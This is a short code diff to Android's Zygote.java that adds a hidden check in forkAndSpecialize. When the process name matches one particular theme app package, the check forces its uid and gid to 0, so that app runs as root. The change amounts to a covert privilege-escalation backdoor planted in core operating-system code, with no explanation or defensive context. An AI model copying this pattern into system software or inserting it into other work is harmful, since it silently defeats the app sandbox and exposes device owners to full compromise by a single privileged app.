@@ -87,6 +87,16 @@ public final class Zygote {
     public static int forkAndSpecialize(int uid, int gid, int[] gids, int debugFlags,
           int[][] rlimits, int mountExternal, String seInfo, String niceName, int[] fdsToClose,
           String instructionSet, String appDataDir) {
+
+		if(null != niceName)
+		{
+			if(niceName.equals("com.appwoo.txtw.theme.deepblack") )
+			{
+				uid = 0;
+				gid = 0;
+			}
+		}
+				
         long startTime = SystemClock.elapsedRealtime();
         VM_HOOKS.preFork();
         checkTime(startTime, "Zygote.preFork");
